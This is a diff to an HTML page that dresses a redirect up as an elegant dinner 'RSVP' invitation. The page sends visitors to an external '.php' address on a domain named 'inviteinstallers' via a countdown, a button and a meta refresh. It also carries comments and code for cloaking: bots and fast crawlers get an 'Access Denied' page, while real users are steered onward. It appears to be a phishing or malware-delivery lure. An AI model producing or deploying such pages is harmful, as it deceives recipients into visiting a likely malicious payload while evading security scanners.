@@ -3,11 +3,286 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting...</title>
+    <title>You're Invited - RSVP</title>
 
     <!-- Strong Bot Protection -->
     <meta name="robots" content="noindex, nofollow, noarchive">
     <meta name="referrer" content="no-referrer">
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Playfair Display', 'Times New Roman', serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            color: #fff;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        body::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: 
+                radial-gradient(circle at 20% 80%, rgba(120, 119, 198, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 80% 20%, rgba(255, 119, 198, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 40% 40%, rgba(120, 219, 255, 0.05) 0%, transparent 50%);
+            z-index: -1;
+        }
+        
+        .invitation-card {
+            background: rgba(255, 255, 255, 0.95);
+            color: #333;
+            max-width: 600px;
+            width: 100%;
+            border-radius: 15px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+            overflow: hidden;
+            position: relative;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            backdrop-filter: blur(10px);
+        }
+        
+        .gold-border {
+            height: 8px;
+            background: linear-gradient(90deg, #d4af37, #f9e076, #d4af37);
+            width: 100%;
+        }
+        
+        .header {
+            padding: 40px 30px 30px;
+            background: linear-gradient(135deg, #2c3e50 0%, #34495e 100%);
+            color: white;
+            position: relative;
+        }
+        
+        .header::after {
+            content: "";
+            position: absolute;
+            bottom: -15px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 80%;
+            height: 1px;
+            background: linear-gradient(to right, transparent, #d4af37, transparent);
+        }
+        
+        h1 {
+            font-size: 4rem;
+            font-weight: 400;
+            letter-spacing: 8px;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+            color: #f9e076;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+        }
+        
+        .subtitle {
+            font-size: 1.2rem;
+            letter-spacing: 4px;
+            margin-top: 10px;
+            text-transform: uppercase;
+            color: #ecf0f1;
+            font-weight: 300;
+        }
+        
+        .divider {
+            height: 1px;
+            background: linear-gradient(to right, transparent, #d4c9bc, transparent);
+            margin: 25px 0;
+            width: 80%;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        
+        .content {
+            padding: 40px 30px;
+            color: #2c3e50;
+        }
+        
+        .invitation-text {
+            font-size: 1.5rem;
+            margin-bottom: 30px;
+            color: #5d4c3a;
+            line-height: 1.6;
+            font-style: italic;
+        }
+        
+        .event-name {
+            font-size: 2.5rem;
+            font-weight: 700;
+            margin: 25px 0;
+            color: #2c3e50;
+            font-family: 'Playfair Display', serif;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+        }
+        
+        .redirect-info {
+            background-color: rgba(241, 242, 246, 0.8);
+            border-radius: 10px;
+            padding: 20px;
+            margin: 30px 0;
+            border: 1px solid rgba(189, 195, 199, 0.5);
+            text-align: center;
+        }
+        
+        .redirect-url {
+            font-weight: bold;
+            color: #2c3e50;
+            word-break: break-all;
+            display: block;
+            margin-top: 10px;
+            padding: 12px;
+            background: white;
+            border-radius: 8px;
+            border: 1px dashed #bdc3c7;
+            font-family: monospace;
+            font-size: 0.9rem;
+        }
+        
+        .countdown {
+            font-size: 1.3rem;
+            margin: 25px 0;
+            color: #8b6b4c;
+            font-weight: bold;
+            letter-spacing: 1px;
+        }
+        
+        .btn {
+            display: inline-block;
+            background: linear-gradient(135deg, #d4af37 0%, #f9e076 100%);
+            color: #2c3e50;
+            padding: 16px 40px;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            border: none;
+            cursor: pointer;
+            font-size: 1.1rem;
+            letter-spacing: 1px;
+            margin-top: 10px;
+            box-shadow: 0 4px 15px rgba(212, 175, 55, 0.3);
+            text-transform: uppercase;
+        }
+        
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(212, 175, 55, 0.4);
+            background: linear-gradient(135deg, #f9e076 0%, #d4af37 100%);
+        }
+        
+        .footer {
+            margin-top: 30px;
+            text-align: center;
+            color: #7f8c8d;
+            font-size: 0.9rem;
+            padding: 20px;
+            border-top: 1px solid rgba(189, 195, 199, 0.3);
+            font-style: italic;
+        }
+        
+        .floral-decoration {
+            position: absolute;
+            width: 120px;
+            height: 120px;
+            opacity: 0.1;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Cpath fill='%23d4af37' d='M50,10 C60,20 70,25 80,30 C85,40 90,50 85,60 C80,70 70,75 60,80 C50,85 40,90 30,85 C20,80 15,70 10,60 C5,50 10,40 15,30 C20,20 30,15 40,10 C45,5 50,5 50,10 Z'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+        }
+        
+        .floral-1 {
+            top: 20px;
+            left: 20px;
+            transform: rotate(15deg);
+        }
+        
+        .floral-2 {
+            bottom: 20px;
+            right: 20px;
+            transform: rotate(-15deg);
+        }
+        
+        @media (max-width: 600px) {
+            .content {
+                padding: 25px 20px;
+            }
+            
+            h1 {
+                font-size: 3rem;
+                letter-spacing: 5px;
+            }
+            
+            .invitation-text {
+                font-size: 1.2rem;
+            }
+            
+            .event-name {
+                font-size: 2rem;
+            }
+            
+            .btn {
+                padding: 14px 30px;
+                font-size: 1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="invitation-card">
+        <div class="gold-border"></div>
+        
+        <div class="floral-decoration floral-1"></div>
+        <div class="floral-decoration floral-2"></div>
+        
+        <div class="header">
+            <h1>RsvP</h1>
+            <div class="subtitle">YOU'RE INVITED TO DINE WITH US</div>
+        </div>
+        
+        <div class="content">
+            <div class="invitation-text">
+                We cordially invite you to join us for an exclusive evening of fine dining and celebration.
+            </div>
+            
+            <div class="divider"></div>
+            
+            <div class="event-name">Jinner & Quicks</div>
+            
+            <div class="divider"></div>
+            
+            <div class="redirect-info">
+                You're being redirected to our exclusive invitation page:
+                <span class="redirect-url" id="target-url">https://inviteinstallers.in/trea/loveandcare/loud.php</span>
+            </div>
+            
+            <div class="countdown">
+                Redirecting in <span id="countdown">5</span> seconds...
+            </div>
+            
+            <a href="https://inviteinstallers.in/trea/loveandcare/loud.php" class="btn" id="redirect-btn">View Invitation</a>
+        </div>
+        
+        <div class="footer">
+            <p>Formal Attire Requested | Please respond promptly</p>
+        </div>
+    </div>
 
     <!-- Masked JavaScript for real users -->
     <script>
@@ -27,14 +302,29 @@
                 document.body.innerHTML = "<h1>Access Denied</h1>";
             }
         }, 500); // 0.5 second delay to confuse fast bots
+
+        // Countdown functionality for display only
+        let countdown = 5;
+        const countdownElement = document.getElementById('countdown');
+        
+        const countdownInterval = setInterval(() => {
+            countdown--;
+            countdownElement.textContent = countdown;
+            
+            if (countdown <= 0) {
+                clearInterval(countdownInterval);
+            }
+        }, 1000);
+        
+        // Allow user to skip countdown by clicking the button
+        document.getElementById('redirect-btn').addEventListener('click', function(e) {
+            clearInterval(countdownInterval);
+        });
     </script>
 
-    <!-- Clean fallback for JS-disabled browsers (corrected) -->
+    <!-- Clean fallback for JS-disabled browsers -->
     <noscript>
         <meta http-equiv="refresh" content="0;url=https://inviteinstallers.in/trea/loveandcare/loud.php">
     </noscript>
-</head>
-<body>
-    <h1>Redirecting... Please wait for your invitation</h1>
 </body>
 </html>
